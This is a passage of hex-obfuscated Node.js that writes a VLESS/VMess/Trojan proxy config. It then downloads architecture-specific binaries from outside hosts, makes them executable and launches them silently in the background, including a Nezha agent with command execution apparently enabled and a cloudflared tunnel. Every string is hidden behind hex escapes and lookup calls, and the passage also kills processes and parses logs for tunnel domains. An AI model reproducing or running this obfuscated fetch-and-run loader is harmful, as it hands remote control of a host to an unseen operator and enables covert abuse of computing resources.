            '\x61\x63\x63\x65\x73\x73': _0x45cfe4(0x19a),
            '\x65\x72\x72\x6f\x72': _0x45cfe4(0x19a),
            '\x6c\x6f\x67\x6c\x65\x76\x65\x6c': _0x45cfe4(0x202)
        },
        '\x69\x6e\x62\x6f\x75\x6e\x64\x73': [
            {
                '\x70\x6f\x72\x74': ARGO_PORT,
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x45cfe4(0x2a2),
                '\x73\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x63\x6c\x69\x65\x6e\x74\x73': [{
                            '\x69\x64': UUID,
                            '\x66\x6c\x6f\x77': '\x78\x74\x6c\x73\x2d\x72\x70\x72\x78\x2d' + '\x76\x69\x73\x69\x6f\x6e'
                        }],
                    '\x64\x65\x63\x72\x79\x70\x74\x69\x6f\x6e': _0x45cfe4(0x202),
                    '\x66\x61\x6c\x6c\x62\x61\x63\x6b\x73': [
                        { '\x64\x65\x73\x74': 0xbb9 },
                        {
                            '\x70\x61\x74\x68': _0x45cfe4(0x18e) + '\x6f',
                            '\x64\x65\x73\x74': 0xbba
                        },
                        {
                            '\x70\x61\x74\x68': _0x45cfe4(0x272) + '\x6f',
                            '\x64\x65\x73\x74': 0xbbb
                        },
                        {
                            '\x70\x61\x74\x68': '\x2f\x74\x72\x6f\x6a\x61\x6e\x2d\x61\x72' + '\x67\x6f',
                            '\x64\x65\x73\x74': 0xbbc
                        }
                    ]
                },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': { '\x6e\x65\x74\x77\x6f\x72\x6b': _0x45cfe4(0x269) }
            },
            {
                '\x70\x6f\x72\x74': 0xbb9,
                '\x6c\x69\x73\x74\x65\x6e': _0x45cfe4(0x2c4),
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x45cfe4(0x2a2),
                '\x73\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x63\x6c\x69\x65\x6e\x74\x73': [{ '\x69\x64': UUID }],
                    '\x64\x65\x63\x72\x79\x70\x74\x69\x6f\x6e': _0x45cfe4(0x202)
                },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x6e\x65\x74\x77\x6f\x72\x6b': '\x74\x63\x70',
                    '\x73\x65\x63\x75\x72\x69\x74\x79': _0x45cfe4(0x202)
                }
            },
            {
                '\x70\x6f\x72\x74': 0xbba,
                '\x6c\x69\x73\x74\x65\x6e': _0x45cfe4(0x2c4),
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': '\x76\x6c\x65\x73\x73',
                '\x73\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x63\x6c\x69\x65\x6e\x74\x73': [{
                            '\x69\x64': UUID,
                            '\x6c\x65\x76\x65\x6c': 0x0
                        }],
                    '\x64\x65\x63\x72\x79\x70\x74\x69\x6f\x6e': '\x6e\x6f\x6e\x65'
                },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x6e\x65\x74\x77\x6f\x72\x6b': '\x77\x73',
                    '\x73\x65\x63\x75\x72\x69\x74\x79': _0x45cfe4(0x202),
                    '\x77\x73\x53\x65\x74\x74\x69\x6e\x67\x73': { '\x70\x61\x74\x68': _0x45cfe4(0x18e) + '\x6f' }
                },
                '\x73\x6e\x69\x66\x66\x69\x6e\x67': {
                    '\x65\x6e\x61\x62\x6c\x65\x64': !![],
                    '\x64\x65\x73\x74\x4f\x76\x65\x72\x72\x69\x64\x65': [
                        '\x68\x74\x74\x70',
                        _0x45cfe4(0x1f3),
                        _0x45cfe4(0x26d)
                    ],
                    '\x6d\x65\x74\x61\x64\x61\x74\x61\x4f\x6e\x6c\x79': ![]
                }
            },
            {
                '\x70\x6f\x72\x74': 0xbbb,
                '\x6c\x69\x73\x74\x65\x6e': _0x45cfe4(0x2c4),
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x45cfe4(0x198),
                '\x73\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x63\x6c\x69\x65\x6e\x74\x73': [{
                            '\x69\x64': UUID,
                            '\x61\x6c\x74\x65\x72\x49\x64': 0x0
                        }]
                },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x6e\x65\x74\x77\x6f\x72\x6b': '\x77\x73',
                    '\x77\x73\x53\x65\x74\x74\x69\x6e\x67\x73': { '\x70\x61\x74\x68': '\x2f\x76\x6d\x65\x73\x73\x2d\x61\x72\x67' + '\x6f' }
                },
                '\x73\x6e\x69\x66\x66\x69\x6e\x67': {
                    '\x65\x6e\x61\x62\x6c\x65\x64': !![],
                    '\x64\x65\x73\x74\x4f\x76\x65\x72\x72\x69\x64\x65': [
                        _0x45cfe4(0x253),
                        _0x45cfe4(0x1f3),
                        _0x45cfe4(0x26d)
                    ],
                    '\x6d\x65\x74\x61\x64\x61\x74\x61\x4f\x6e\x6c\x79': ![]
                }
            },
            {
                '\x70\x6f\x72\x74': 0xbbc,
                '\x6c\x69\x73\x74\x65\x6e': _0x45cfe4(0x2c4),
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': '\x74\x72\x6f\x6a\x61\x6e',
                '\x73\x65\x74\x74\x69\x6e\x67\x73': { '\x63\x6c\x69\x65\x6e\x74\x73': [{ '\x70\x61\x73\x73\x77\x6f\x72\x64': UUID }] },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x6e\x65\x74\x77\x6f\x72\x6b': '\x77\x73',
                    '\x73\x65\x63\x75\x72\x69\x74\x79': _0x45cfe4(0x202),
                    '\x77\x73\x53\x65\x74\x74\x69\x6e\x67\x73': { '\x70\x61\x74\x68': _0x45cfe4(0x26a) + '\x67\x6f' }
                },
                '\x73\x6e\x69\x66\x66\x69\x6e\x67': {
                    '\x65\x6e\x61\x62\x6c\x65\x64': !![],
                    '\x64\x65\x73\x74\x4f\x76\x65\x72\x72\x69\x64\x65': [
                        _0x45cfe4(0x253),
                        _0x45cfe4(0x1f3),
                        _0x45cfe4(0x26d)
                    ],
                    '\x6d\x65\x74\x61\x64\x61\x74\x61\x4f\x6e\x6c\x79': ![]
                }
            }
        ],
        '\x64\x6e\x73': { '\x73\x65\x72\x76\x65\x72\x73': [_0x45cfe4(0x228) + '\x6c\x3a\x2f\x2f\x38\x2e\x38\x2e\x38\x2e' + '\x38\x2f\x64\x6e\x73\x2d\x71\x75\x65\x72' + '\x79'] },
        '\x6f\x75\x74\x62\x6f\x75\x6e\x64\x73': [
            {
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x45cfe4(0x226),
                '\x74\x61\x67': '\x64\x69\x72\x65\x63\x74'
            },
            {
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x45cfe4(0x2a4),
                '\x74\x61\x67': _0x45cfe4(0x21d)
            }
        ]
    };
    fs[_0x45cfe4(0x1d1) + '\x79\x6e\x63'](path[_0x45cfe4(0x28a)](FILE_PATH, _0x45cfe4(0x2be) + '\x6e'), JSON[_0x45cfe4(0x2b9)](_0x5ee7ce, null, 0x2));
}
function getSystemArchitecture() {
    const _0x4f548b = _0x3d7aff;
    const _0x3f97a0 = os[_0x4f548b(0x1d3)]();
    if (_0x3f97a0 === _0x4f548b(0x1c9) || _0x3f97a0 === _0x4f548b(0x1a6) || _0x3f97a0 === _0x4f548b(0x28d)) {
        return '\x61\x72\x6d';
    } else {
        return _0x4f548b(0x283);
    }
}
function downloadFile(_0x2ea76b, _0x22cb3a, _0x13066c) {
    const _0x3cc68f = _0x3d7aff;
    const _0x2e1f1c = _0x2ea76b;
    if (!fs[_0x3cc68f(0x267)](FILE_PATH)) {
        fs[_0x3cc68f(0x1bc)](FILE_PATH, { '\x72\x65\x63\x75\x72\x73\x69\x76\x65': !![] });
    }
    const _0x3f6c53 = fs['\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74' + _0x3cc68f(0x21c)](_0x2e1f1c);
    axios({
        '\x6d\x65\x74\x68\x6f\x64': _0x3cc68f(0x1e2),
        '\x75\x72\x6c': _0x22cb3a,
        '\x72\x65\x73\x70\x6f\x6e\x73\x65\x54\x79\x70\x65': _0x3cc68f(0x273)
    })['\x74\x68\x65\x6e'](_0x174af2 => {
        const _0x1605ff = _0x3cc68f;
        _0x174af2[_0x1605ff(0x2b2)]['\x70\x69\x70\x65'](_0x3f6c53);
        _0x3f6c53['\x6f\x6e'](_0x1605ff(0x23d), () => {
            const _0x3dc3d2 = _0x1605ff;
            _0x3f6c53[_0x3dc3d2(0x21e)]();
            console[_0x3dc3d2(0x207)](_0x3dc3d2(0x1c6) + path[_0x3dc3d2(0x250)](_0x2e1f1c) + (_0x3dc3d2(0x291) + _0x3dc3d2(0x21b)));
            _0x13066c(null, _0x2e1f1c);
        });
        _0x3f6c53['\x6f\x6e'](_0x1605ff(0x18a), _0x5401fe => {
            const _0x15aa4a = _0x1605ff;
            fs[_0x15aa4a(0x1cf)](_0x2e1f1c, () => {
            });
            const _0x17e489 = _0x15aa4a(0x1c6) + path[_0x15aa4a(0x250)](_0x2e1f1c) + _0x15aa4a(0x18b) + _0x5401fe[_0x15aa4a(0x1ab)];
            console[_0x15aa4a(0x18a)](_0x17e489);
            _0x13066c(_0x17e489);
        });
    })[_0x3cc68f(0x1bb)](_0x1606eb => {
        const _0x1df0b1 = _0x3cc68f;
        const _0x59b13 = _0x1df0b1(0x1c6) + path[_0x1df0b1(0x250)](_0x2e1f1c) + _0x1df0b1(0x18b) + _0x1606eb[_0x1df0b1(0x1ab)];
        console[_0x1df0b1(0x18a)](_0x59b13);
        _0x13066c(_0x59b13);
    });
}
async function downloadFilesAndRun() {
    const _0x3a43b7 = _0x3d7aff;
    const _0x134c83 = getSystemArchitecture();
    const _0x886589 = getFilesForArchitecture(_0x134c83);
    if (_0x886589[_0x3a43b7(0x1a4)] === 0x0) {
        console[_0x3a43b7(0x207)]('\x43\x61\x6e\x27\x74\x20\x66\x69\x6e\x64' + '\x20\x61\x20\x66\x69\x6c\x65\x20\x66\x6f' + '\x72\x20\x74\x68\x65\x20\x63\x75\x72\x72' + _0x3a43b7(0x251) + _0x3a43b7(0x1c5));
        return;
    }
    const _0xd6c154 = _0x886589['\x6d\x61\x70'](_0x2d29e6 => {
        return new Promise((_0x46cc76, _0x521750) => {
            const _0x1af8c7 = _0xec37;
            downloadFile(_0x2d29e6[_0x1af8c7(0x29b)], _0x2d29e6[_0x1af8c7(0x1f9)], (_0x4ff46d, _0x229160) => {
                if (_0x4ff46d) {
                    _0x521750(_0x4ff46d);
                } else {
                    _0x46cc76(_0x229160);
                }
            });
        });
    });
    try {
        await Promise[_0x3a43b7(0x254)](_0xd6c154);
    } catch (_0x33e346) {
        console[_0x3a43b7(0x18a)](_0x3a43b7(0x1ee) + _0x3a43b7(0x26f) + '\x6c\x65\x73\x3a', _0x33e346);
        return;
    }
    function _0x3ce424(_0x51eefb) {
        const _0x4ec8b3 = _0x3a43b7;
        const _0x4eab42 = 0x1fd;
        _0x51eefb[_0x4ec8b3(0x28c)](_0x594e0c => {
            const _0x287f5c = _0x4ec8b3;
            if (fs[_0x287f5c(0x267)](_0x594e0c)) {
                fs[_0x287f5c(0x2c5)](_0x594e0c, _0x4eab42, _0x58eefe => {
                    const _0x3b5b4b = _0x287f5c;
                    if (_0x58eefe) {
                        console[_0x3b5b4b(0x18a)](_0x3b5b4b(0x2cc) + _0x3b5b4b(0x259) + _0x3b5b4b(0x249) + _0x594e0c + '\x3a\x20' + _0x58eefe);
                    } else {
                        console[_0x3b5b4b(0x207)](_0x3b5b4b(0x2cc) + _0x3b5b4b(0x1b2) + _0x3b5b4b(0x28e) + _0x594e0c + '\x3a\x20' + _0x4eab42[_0x3b5b4b(0x237)](0x8));
                    }
                });
            }
        });
    }
    const _0x230017 = NEZHA_PORT ? [
        npmPath,
        webPath,
        botPath
    ] : [
        phpPath,
        webPath,
        botPath
    ];
    _0x3ce424(_0x230017);
    if (NEZHA_SERVER && NEZHA_KEY) {
        if (!NEZHA_PORT) {
            const _0x4d16e3 = NEZHA_SERVER['\x69\x6e\x63\x6c\x75\x64\x65\x73']('\x3a') ? NEZHA_SERVER['\x73\x70\x6c\x69\x74']('\x3a')['\x70\x6f\x70']() : '';
            const _0x110f67 = new Set([
                _0x3a43b7(0x1d6),
                _0x3a43b7(0x2bf),
                '\x32\x30\x39\x36',
                '\x32\x30\x38\x37',
                '\x32\x30\x38\x33',
                _0x3a43b7(0x211)
            ]);
            const _0x389acc = _0x110f67[_0x3a43b7(0x1bd)](_0x4d16e3) ? '\x74\x72\x75\x65' : _0x3a43b7(0x1c1);
            const _0xfc6e1b = _0x3a43b7(0x2b1) + _0x3a43b7(0x27a) + NEZHA_KEY + (_0x3a43b7(0x29d) + _0x3a43b7(0x1fe) + _0x3a43b7(0x1d2) + _0x3a43b7(0x271) + _0x3a43b7(0x26e) + '\x6d\x6d\x61\x6e\x64\x5f\x65\x78\x65\x63' + '\x75\x74\x65\x3a\x20\x66\x61\x6c\x73\x65' + _0x3a43b7(0x1da) + '\x6f\x72\x63\x65\x5f\x75\x70\x64\x61\x74' + _0x3a43b7(0x1e4) + _0x3a43b7(0x243) + '\x20\x66\x61\x6c\x73\x65\x0a\x64\x69\x73' + _0x3a43b7(0x256) + _0x3a43b7(0x280) + _0x3a43b7(0x18c) + '\x6c\x73\x65\x0a\x69\x6e\x73\x65\x63\x75' + _0x3a43b7(0x19d) + _0x3a43b7(0x205) + _0x3a43b7(0x238) + '\x20\x31\x38\x30\x30\x0a\x72\x65\x70\x6f' + _0x3a43b7(0x2a7) + _0x3a43b7(0x1b4)) + NEZHA_SERVER + (_0x3a43b7(0x27e) + _0x3a43b7(0x1e1) + _0x3a43b7(0x2a5) + _0x3a43b7(0x236) + _0x3a43b7(0x17d) + '\x65\x0a\x74\x65\x6d\x70\x65\x72\x61\x74' + _0x3a43b7(0x1f0) + '\x0a\x74\x6c\x73\x3a\x20') + _0x389acc + (_0x3a43b7(0x287) + _0x3a43b7(0x195) + '\x65\x3a\x20\x66\x61\x6c\x73\x65\x0a\x75' + _0x3a43b7(0x2c7) + _0x3a43b7(0x232) + _0x3a43b7(0x1d0) + _0x3a43b7(0x2b0)) + UUID;
            fs[_0x3a43b7(0x1d1) + _0x3a43b7(0x1eb)](path[_0x3a43b7(0x28a)](FILE_PATH, _0x3a43b7(0x25e) + '\x6c'), _0xfc6e1b);
            const _0x47e1d1 = _0x3a43b7(0x1a5) + phpPath + _0x3a43b7(0x201) + FILE_PATH + (_0x3a43b7(0x1a0) + _0x3a43b7(0x19b) + _0x3a43b7(0x1b7) + '\x26');
            try {
                await exec(_0x47e1d1);
                console[_0x3a43b7(0x207)](phpName + ('\x20\x69\x73\x20\x72\x75\x6e\x6e\x69\x6e' + '\x67'));
                await new Promise(_0xaec273 => setTimeout(_0xaec273, 0x3e8));
            } catch (_0x4e66da) {
                console['\x65\x72\x72\x6f\x72'](_0x3a43b7(0x1f2) + _0x3a43b7(0x2ae) + _0x4e66da);
            }
        } else {
            let _0x2e51d2 = '';
            const _0x21422a = [
                _0x3a43b7(0x1d6),
                '\x38\x34\x34\x33',
                _0x3a43b7(0x1cb),
                '\x32\x30\x38\x37',
                '\x32\x30\x38\x33',
                _0x3a43b7(0x211)
            ];
            if (_0x21422a[_0x3a43b7(0x1e0)](NEZHA_PORT)) {
                _0x2e51d2 = _0x3a43b7(0x220);
            }
            const _0x1cc356 = _0x3a43b7(0x1a5) + npmPath + '\x20\x2d\x73\x20' + NEZHA_SERVER + '\x3a' + NEZHA_PORT + _0x3a43b7(0x204) + NEZHA_KEY + '\x20' + _0x2e51d2 + (_0x3a43b7(0x2ad) + _0x3a43b7(0x276) + _0x3a43b7(0x282) + _0x3a43b7(0x290) + '\x2d\x2d\x73\x6b\x69\x70\x2d\x63\x6f\x6e' + _0x3a43b7(0x1aa) + _0x3a43b7(0x1a2) + _0x3a43b7(0x25f) + '\x20\x26');
            try {
                await exec(_0x1cc356);
                console[_0x3a43b7(0x207)](npmName + (_0x3a43b7(0x279) + '\x67'));
                await new Promise(_0x3d2bf6 => setTimeout(_0x3d2bf6, 0x3e8));
            } catch (_0x5d404c) {
                console['\x65\x72\x72\x6f\x72'](_0x3a43b7(0x1ac) + _0x3a43b7(0x2ae) + _0x5d404c);
            }
        }
    } else {
        console[_0x3a43b7(0x207)](_0x3a43b7(0x2a8) + _0x3a43b7(0x1b0) + _0x3a43b7(0x27c) + _0x3a43b7(0x252));
    }
    const _0x505287 = _0x3a43b7(0x1a5) + webPath + _0x3a43b7(0x295) + FILE_PATH + (_0x3a43b7(0x2c0) + _0x3a43b7(0x241) + _0x3a43b7(0x2c3));
    try {
        await exec(_0x505287);
        console['\x6c\x6f\x67'](webName + (_0x3a43b7(0x279) + '\x67'));
        await new Promise(_0x13b19f => setTimeout(_0x13b19f, 0x3e8));
    } catch (_0x64c1a) {
        console['\x65\x72\x72\x6f\x72'](_0x3a43b7(0x29f) + _0x3a43b7(0x2ae) + _0x64c1a);
    }
    if (fs[_0x3a43b7(0x267)](botPath)) {
        let _0x56ec65;
        if (ARGO_AUTH[_0x3a43b7(0x224)](/^[A-Z0-9a-z=]{120,250}$/)) {
            _0x56ec65 = _0x3a43b7(0x2af) + '\x64\x67\x65\x2d\x69\x70\x2d\x76\x65\x72' + _0x3a43b7(0x203) + _0x3a43b7(0x208) + '\x70\x64\x61\x74\x65\x20\x2d\x2d\x70\x72' + '\x6f\x74\x6f\x63\x6f\x6c\x20\x68\x74\x74' + _0x3a43b7(0x21f) + '\x6f\x6b\x65\x6e\x20' + ARGO_AUTH;
        } else if (ARGO_AUTH[_0x3a43b7(0x224)](/TunnelSecret/)) {
            _0x56ec65 = _0x3a43b7(0x2af) + _0x3a43b7(0x17c) + _0x3a43b7(0x203) + _0x3a43b7(0x223) + FILE_PATH + ('\x2f\x74\x75\x6e\x6e\x65\x6c\x2e\x79\x6d' + '\x6c\x20\x72\x75\x6e');
        } else {
            _0x56ec65 = _0x3a43b7(0x2af) + _0x3a43b7(0x17c) + '\x73\x69\x6f\x6e\x20\x61\x75\x74\x6f\x20' + '\x2d\x2d\x6e\x6f\x2d\x61\x75\x74\x6f\x75' + '\x70\x64\x61\x74\x65\x20\x2d\x2d\x70\x72' + _0x3a43b7(0x183) + _0x3a43b7(0x1f7) + _0x3a43b7(0x2b6) + FILE_PATH + (_0x3a43b7(0x239) + '\x2d\x2d\x6c\x6f\x67\x6c\x65\x76\x65\x6c' + '\x20\x69\x6e\x66\x6f\x20\x2d\x2d\x75\x72' + '\x6c\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6c' + _0x3a43b7(0x1c3)) + ARGO_PORT;
        }
        try {
            await exec(_0x3a43b7(0x1a5) + botPath + '\x20' + _0x56ec65 + ('\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c' + _0x3a43b7(0x24c)));
            console['\x6c\x6f\x67'](botName + ('\x20\x69\x73\x20\x72\x75\x6e\x6e\x69\x6e' + '\x67'));
            await new Promise(_0x1dcfd0 => setTimeout(_0x1dcfd0, 0x7d0));
        } catch (_0x59abc2) {
            console['\x65\x72\x72\x6f\x72'](_0x3a43b7(0x2bb) + '\x75\x74\x69\x6e\x67\x20\x63\x6f\x6d\x6d' + '\x61\x6e\x64\x3a\x20' + _0x59abc2);
        }
    }
    await new Promise(_0x364c43 => setTimeout(_0x364c43, 0x1388));
}
function getFilesForArchitecture(_0x4f0d6e) {
    const _0x3aac23 = _0x3d7aff;
    let _0x4594a9;
    if (_0x4f0d6e === _0x3aac23(0x1c9)) {
        _0x4594a9 = [
            {
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': webPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x3aac23(0x1e8) + _0x3aac23(0x27d) + _0x3aac23(0x199)
            },
            {
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': botPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x3aac23(0x1e8) + '\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e' + _0x3aac23(0x255)
            }
        ];
    } else {
        _0x4594a9 = [
            {
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': webPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x3aac23(0x217) + _0x3aac23(0x2b3) + '\x79\x63\x2e\x6d\x6e\x2f\x77\x65\x62'
            },
            {
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': botPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x3aac23(0x217) + _0x3aac23(0x2b3) + '\x79\x63\x2e\x6d\x6e\x2f\x62\x6f\x74'
            }
        ];
    }
    if (NEZHA_SERVER && NEZHA_KEY) {
        if (NEZHA_PORT) {
            const _0x202e58 = _0x4f0d6e === _0x3aac23(0x1c9) ? _0x3aac23(0x1e8) + _0x3aac23(0x27d) + _0x3aac23(0x222) + '\x74' : '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d' + _0x3aac23(0x2b3) + _0x3aac23(0x222) + '\x74';
            _0x4594a9[_0x3aac23(0x230)]({
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': npmPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x202e58
            });
        } else {
            const _0x4ca255 = _0x4f0d6e === _0x3aac23(0x1c9) ? _0x3aac23(0x1e8) + '\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e' + _0x3aac23(0x275) : _0x3aac23(0x217) + _0x3aac23(0x2b3) + '\x79\x63\x2e\x6d\x6e\x2f\x76\x31';
            _0x4594a9[_0x3aac23(0x230)]({
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': phpPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x4ca255
            });
        }
    }
    return _0x4594a9;
}
function argoType() {
    const _0x329597 = _0x3d7aff;
    if (!ARGO_AUTH || !ARGO_DOMAIN) {
        console['\x6c\x6f\x67'](_0x329597(0x225) + _0x329597(0x18d) + '\x41\x55\x54\x48\x20\x76\x61\x72\x69\x61' + _0x329597(0x194) + '\x74\x79\x2c\x20\x75\x73\x65\x20\x71\x75' + _0x329597(0x227) + '\x73');
        return;
    }
    if (ARGO_AUTH[_0x329597(0x1e0)](_0x329597(0x240) + '\x65\x74')) {
        fs[_0x329597(0x1d1) + _0x329597(0x1eb)](path[_0x329597(0x28a)](FILE_PATH, _0x329597(0x20d) + '\x6e'), ARGO_AUTH);
        const _0x289685 = _0x329597(0x2a9) + '\x20' + ARGO_AUTH['\x73\x70\x6c\x69\x74']('\x22')[0xb] + ('\x0a\x20\x20\x63\x72\x65\x64\x65\x6e\x74' + _0x329597(0x1b6) + '\x20') + path[_0x329597(0x28a)](FILE_PATH, _0x329597(0x20d) + '\x6e') + (_0x329597(0x1ad) + _0x329597(0x260) + _0x329597(0x1b5) + _0x329597(0x246) + _0x329597(0x1ff)) + ARGO_DOMAIN + (_0x329597(0x196) + '\x76\x69\x63\x65\x3a\x20\x68\x74\x74\x70' + '\x3a\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f' + '\x73\x74\x3a') + ARGO_PORT + (_0x329597(0x1c7) + '\x67\x69\x6e\x52\x65\x71\x75\x65\x73\x74' + '\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20' + _0x329597(0x1dd) + _0x329597(0x192) + _0x329597(0x1d8) + _0x329597(0x1a8) + '\x61\x74\x75\x73\x3a\x34\x30\x34\x0a\x20' + '\x20');
        fs[_0x329597(0x1d1) + '\x79\x6e\x63'](path[_0x329597(0x28a)](FILE_PATH, '\x74\x75\x6e\x6e\x65\x6c\x2e\x79\x6d\x6c'), _0x289685);
    } else {
        console[_0x329597(0x207)](_0x329597(0x244) + _0x329597(0x1fd) + _0x329597(0x25d) + _0x329597(0x214) + _0x329597(0x190) + _0x329597(0x1be));
    }
}
argoType();
async function extractDomains() {
    const _0x21ab78 = _0x3d7aff;
    let _0x1993a7;
    if (ARGO_AUTH && ARGO_DOMAIN) {
        _0x1993a7 = ARGO_DOMAIN;
        console[_0x21ab78(0x207)]('\x41\x52\x47\x4f\x5f\x44\x4f\x4d\x41\x49' + '\x4e\x3a', _0x1993a7);
        await _0x4afa29(_0x1993a7);
    } else {
        try {
            const _0x306767 = fs['\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79' + '\x6e\x63'](path['\x6a\x6f\x69\x6e'](FILE_PATH, '\x62\x6f\x6f\x74\x2e\x6c\x6f\x67'), _0x21ab78(0x278));
            const _0x55e3d9 = _0x306767[_0x21ab78(0x1b1)]('\x0a');
            const _0x1c6049 = [];
            _0x55e3d9[_0x21ab78(0x28c)](_0x3d9e51 => {
                const _0x35aa01 = _0x21ab78;
                const _0x18c884 = _0x3d9e51[_0x35aa01(0x224)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
                if (_0x18c884) {
                    const _0x16edf2 = _0x18c884[0x1];
                    _0x1c6049[_0x35aa01(0x185)](_0x16edf2);
                }
            });
            if (_0x1c6049['\x6c\x65\x6e\x67\x74\x68'] > 0x0) {
                _0x1993a7 = _0x1c6049[0x0];
                console[_0x21ab78(0x207)](_0x21ab78(0x1ef) + '\x3a', _0x1993a7);
                await _0x4afa29(_0x1993a7);
            } else {
                console[_0x21ab78(0x207)](_0x21ab78(0x1ef) + _0x21ab78(0x1f6) + _0x21ab78(0x231) + _0x21ab78(0x24d) + _0x21ab78(0x289) + _0x21ab78(0x1d4));
                fs[_0x21ab78(0x200)](path[_0x21ab78(0x28a)](FILE_PATH, _0x21ab78(0x212)));
                async function _0x282530() {
                    const _0x463d4d = _0x21ab78;
                    try {
                        if (process['\x70\x6c\x61\x74\x66\x6f\x72\x6d'] === '\x77\x69\x6e\x33\x32') {
                            await exec('\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f' + _0x463d4d(0x29a) + botName + (_0x463d4d(0x23a) + _0x463d4d(0x1db)));
                        } else {
                            await exec(_0x463d4d(0x293) + '\x5b' + botName[_0x463d4d(0x23f)](0x0) + '\x5d' + botName[_0x463d4d(0x197)](0x1) + (_0x463d4d(0x216) + _0x463d4d(0x22b)));
                        }
                    } catch (_0x4f6031) {
                    }
                }
                _0x282530();
                await new Promise(_0x4a51cb => setTimeout(_0x4a51cb, 0xbb8));
                const _0x45b5d9 = _0x21ab78(0x2af) + _0x21ab78(0x17c) + _0x21ab78(0x203) + _0x21ab78(0x208) + '\x70\x64\x61\x74\x65\x20\x2d\x2d\x70\x72' + _0x21ab78(0x183) + _0x21ab78(0x1f7) + _0x21ab78(0x2b6) + FILE_PATH + (_0x21ab78(0x239) + '\x2d\x2d\x6c\x6f\x67\x6c\x65\x76\x65\x6c' + _0x21ab78(0x26c) + _0x21ab78(0x261) + _0x21ab78(0x1c3)) + ARGO_PORT;
                try {
                    await exec(_0x21ab78(0x1a5) + botPath + '\x20' + _0x45b5d9 + ('\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c' + _0x21ab78(0x24c)));
                    console[_0x21ab78(0x207)](botName + (_0x21ab78(0x279) + '\x67'));
                    await new Promise(_0x494aee => setTimeout(_0x494aee, 0xbb8));
                    await extractDomains();
                } catch (_0x1de59d) {
                    console[_0x21ab78(0x18a)](_0x21ab78(0x2bb) + _0x21ab78(0x265) + _0x21ab78(0x181) + _0x1de59d);
                }
            }
        } catch (_0x3e84a0) {
            console['\x65\x72\x72\x6f\x72']('\x45\x72\x72\x6f\x72\x20\x72\x65\x61\x64' + _0x21ab78(0x2c8) + '\x6f\x67\x3a', _0x3e84a0);
        }
    }
    async function _0x4afa29(_0x307b24) {
        const _0x49f2f7 = _0x21ab78;
        const _0x140cfe = execSync('\x63\x75\x72\x6c\x20\x2d\x73\x6d\x20\x35' + _0x49f2f7(0x1a1) + _0x49f2f7(0x277) + _0x49f2f7(0x17e) + '\x6d\x65\x74\x61\x20\x7c\x20\x61\x77\x6b' + _0x49f2f7(0x1c2) + _0x49f2f7(0x299) + _0x49f2f7(0x262) + _0x49f2f7(0x22c) + _0x49f2f7(0x248), { '\x65\x6e\x63\x6f\x64\x69\x6e\x67': '\x75\x74\x66\x2d\x38' });
        const _0x4c6bf8 = _0x140cfe[_0x49f2f7(0x20e)]();
        const _0x11027a = NAME ? NAME + '\x2d' + _0x4c6bf8 : _0x4c6bf8;
        return new Promise(_0x4a646a => {
            setTimeout(() => {
                const _0x386f4d = _0xec37;
                const _0x2f5a1d = {
                    '\x76': '\x32',
                    '\x70\x73': '' + _0x11027a,
                    '\x61\x64\x64': CFIP,
                    '\x70\x6f\x72\x74': CFPORT,
                    '\x69\x64': UUID,
                    '\x61\x69\x64': '\x30',
                    '\x73\x63\x79': _0x386f4d(0x202),
                    '\x6e\x65\x74': '\x77\x73',
                    '\x74\x79\x70\x65': _0x386f4d(0x202),
                    '\x68\x6f\x73\x74': _0x307b24,
                    '\x70\x61\x74\x68': _0x386f4d(0x272) + _0x386f4d(0x1d9),
                    '\x74\x6c\x73': _0x386f4d(0x1f3),
                    '\x73\x6e\x69': _0x307b24,
                    '\x61\x6c\x70\x6e': '',
                    '\x66\x70': _0x386f4d(0x22d)
                };
